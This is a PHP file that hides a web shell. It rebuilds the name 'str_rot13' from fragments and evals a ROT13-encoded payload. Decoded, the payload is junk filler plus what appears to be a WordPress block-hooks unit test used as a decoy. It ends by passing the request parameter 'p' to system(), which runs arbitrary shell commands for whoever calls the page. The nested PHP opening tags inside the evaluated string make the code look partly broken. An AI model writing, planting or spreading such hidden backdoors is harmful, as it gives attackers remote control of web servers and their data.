<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur vafreg_ubbxrq_oybpxf shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 *
 * @fvapr 6.5.0
 *
 * @tebhc oybpxf
 * @tebhc oybpx-ubbxf
 */
pynff Grfgf_Oybpxf_VafregUbbxrqOybpxf rkgraqf JC_HavgGrfgPnfr {
	pbafg NAPUBE_OYBPX_GLCR       = 'grfgf/napube-oybpx';
	pbafg UBBXRQ_OYBPX_GLCR       = 'grfgf/ubbxrq-oybpx';
	pbafg BGURE_UBBXRQ_OYBPX_GLCR = 'grfgf/bgure-ubbxrq-oybpx';

	pbafg UBBXRQ_OYBPXF = neenl(
		frys::NAPUBE_OYBPX_GLCR => neenl(
			'nsgre'  => neenl( frys::UBBXRQ_OYBPX_GLCR ),
			'orsber' => neenl( frys::BGURE_UBBXRQ_OYBPX_GLCR ),
		),
	);

	/**
	 * @gvpxrg 59572
	 * @gvpxrg 60126
	 * @gvpxrg 60506
	 *
	 * @pbiref ::vafreg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_ergheaf_pbeerpg_znexhc() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => frys::NAPUBE_OYBPX_GLCR,
		);

		$npghny = vafreg_ubbxrq_oybpxf( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		$guvf->nffregFnzr(
			'<!-- jc:' . frys::UBBXRQ_OYBPX_GLCR . ' /-->',
			$npghny,
			\"Znexhc sbe ubbxrq oybpx jnfa'g trarengrq pbeerpgyl.\"
		);
	}

	/**
	 * @gvpxrg 59572
	 * @gvpxrg 60126
	 * @gvpxrg 60506
	 *
	 * @pbiref ::vafreg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_vs_oybpx_vf_vtaberq() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => 'grfgf/napube-oybpx',
			'nggef'     => neenl(
				'zrgnqngn' => neenl(
					'vtaberqUbbxrqOybpxf' => neenl( frys::UBBXRQ_OYBPX_GLCR ),
				),
			),
		);

		$npghny = vafreg_ubbxrq_oybpxf( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		$guvf->nffregFnzr(
			'',
			$npghny,
			\"Ab znexhc fubhyq'ir orra trarengrq sbe vtaberq ubbxrq oybpx.\"
		);
	}

	/**
	 * @gvpxrg 59572
	 * @gvpxrg 60126
	 * @gvpxrg 60506
	 *
	 * @pbiref ::vafreg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_vs_bgure_oybpx_vf_vtaberq() {
		$napube_oybpx = neenl(
			'oybpxAnzr' => 'grfgf/napube-oybpx',
			'nggef'     => neenl(
				'zrgnqngn' => neenl(
					'vtaberqUbbxrqOybpxf' => neenl( frys::UBBXRQ_OYBPX_GLCR ),
				),
			),
		);

		$npghny = vafreg_ubbxrq_oybpxf( $napube_oybpx, 'orsber', frys::UBBXRQ_OYBPXF, neenl() );
		$guvf->nffregFnzr(
			'<!-- jc:' . frys::BGURE_UBBXRQ_OYBPX_GLCR . ' /-->',
			$npghny,
			\"Znexhc sbe arjyl ubbxrq oybpx fubhyq'ir orra trarengrq.\"
		);
	}

	/**
	 * @gvpxrg 59572
	 * @gvpxrg 60126
	 * @gvpxrg 60506
	 *
	 * @pbiref ::vafreg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_svygre_pna_frg_nggevohgrf() {
		$napube_oybpx = neenl(
			'oybpxAnzr'    => frys::NAPUBE_OYBPX_GLCR,
			'nggef'        => neenl(
				'ynlbhg' => neenl(
					'glcr' => 'pbafgenvarq',
				),
			),
			'vaarePbagrag' => neenl(),
		);

		$svygre = shapgvba ( $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx ) {
			// Vf gur ubbxrq oybpx nqwnprag gb gur napube oybpx?
			vs ( 'orsber' !== $eryngvir_cbfvgvba && 'nsgre' !== $eryngvir_cbfvgvba ) {
				erghea $cnefrq_ubbxrq_oybpx;
			}

			// Qbrf gur napube oybpx unir n ynlbhg nggevohgr?
			vs ( vffrg( $cnefrq_napube_oybpx['nggef']['ynlbhg'] ) ) {
				// Pbcl gur napube oybpx'f ynlbhg nggevohgr gb gur ubbxrq oybpx.
				$cnefrq_ubbxrq_oybpx['nggef']['ynlbhg'] = $cnefrq_napube_oybpx['nggef']['ynlbhg'];
			}

			erghea $cnefrq_ubbxrq_oybpx;
		};
		nqq_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre, 10, 4 );
		$npghny = vafreg_ubbxrq_oybpxf( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		erzbir_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre );

		$guvf->nffregFnzr(
			'<!-- jc:' . frys::UBBXRQ_OYBPX_GLCR . ' {\"ynlbhg\":{\"glcr\":\"pbafgenvarq\"}} /-->',
			$npghny,
			\"Znexhc jnfa'g trarengrq pbeerpgyl sbe ubbxrq oybpx jvgu nggevohgr frg ol svygre.\"
		);
	}

	/**
	 * @gvpxrg 59572
	 * @gvpxrg 60126
	 * @gvpxrg 60506
	 *
	 * @pbiref ::vafreg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_svygre_pna_jenc_oybpx() {
		$napube_oybpx = neenl(
			'oybpxAnzr'    => frys::NAPUBE_OYBPX_GLCR,
			'nggef'        => neenl(
				'ynlbhg' => neenl(
					'glcr' => 'pbafgenvarq',
				),
			),
			'vaarePbagrag' => neenl(),
		);

		$svygre = shapgvba ( $cnefrq_ubbxrq_oybpx ) {
			vs ( frys::UBBXRQ_OYBPX_GLCR !== $cnefrq_ubbxrq_oybpx['oybpxAnzr'] ) {
				erghea $cnefrq_ubbxrq_oybpx;
			}

			// Jenc gur oybpx va n Tebhc oybpx.
			erghea neenl(
				'oybpxAnzr'    => 'pber/tebhc',
				'nggef'        => neenl(),
				'vaareOybpxf'  => neenl( $cnefrq_ubbxrq_oybpx ),
				'vaarePbagrag' => neenl(
					'<qvi pynff=\"jc-oybpx-tebhc\">',
					ahyy,
					'</qvi>',
				),
			);
		};
		nqq_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre, 10, 3 );
		$npghny = vafreg_ubbxrq_oybpxf( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		erzbir_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre );

		$guvf->nffregFnzr(
			'<!-- jc:tebhc --><qvi pynff=\"jc-oybpx-tebhc\"><!-- jc:' . frys::UBBXRQ_OYBPX_GLCR . ' /--></qvi><!-- /jc:tebhc -->',
			$npghny,
			\"Znexhc jnfa'g trarengrq pbeerpgyl sbe ubbxrq oybpx jenccrq va Tebhc oybpx ol svygre.\"
		);
	}

	/**
	 * @gvpxrg 60580
	 *
	 * @pbiref ::vafreg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_vafreg_ubbxrq_oybpxf_svygre_pna_fhccerff_ubbxrq_oybpx() {
		$napube_oybpx = neenl(
			'oybpxAnzr'    => frys::NAPUBE_OYBPX_GLCR,
			'nggef'        => neenl(
				'ynlbhg' => neenl(
					'glcr' => 'syrk',
				),
			),
			'vaarePbagrag' => neenl(),
		);

		$svygre = shapgvba ( $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx ) {
			// Vf gur ubbxrq oybpx nqwnprag gb gur napube oybpx?
			vs ( 'orsber' !== $eryngvir_cbfvgvba && 'nsgre' !== $eryngvir_cbfvgvba ) {
				erghea $cnefrq_ubbxrq_oybpx;
			}

			vs (
				vffrg( $cnefrq_napube_oybpx['nggef']['ynlbhg']['glcr'] ) &&
				'syrk' === $cnefrq_napube_oybpx['nggef']['ynlbhg']['glcr']
			) {
				erghea ahyy;
			}

			erghea $cnefrq_ubbxrq_oybpx;
		};
		nqq_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre, 10, 4 );
		$npghny = vafreg_ubbxrq_oybpxf( $napube_oybpx, 'nsgre', frys::UBBXRQ_OYBPXF, neenl() );
		erzbir_svygre( 'ubbxrq_oybpx_' . frys::UBBXRQ_OYBPX_GLCR, $svygre );

		$guvf->nffregFnzr( '', $npghny, \"Ab znexhc fubhyq'ir orra trarengrq sbe ubbxrq oybpx fhccerffrq ol svygre.\" );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>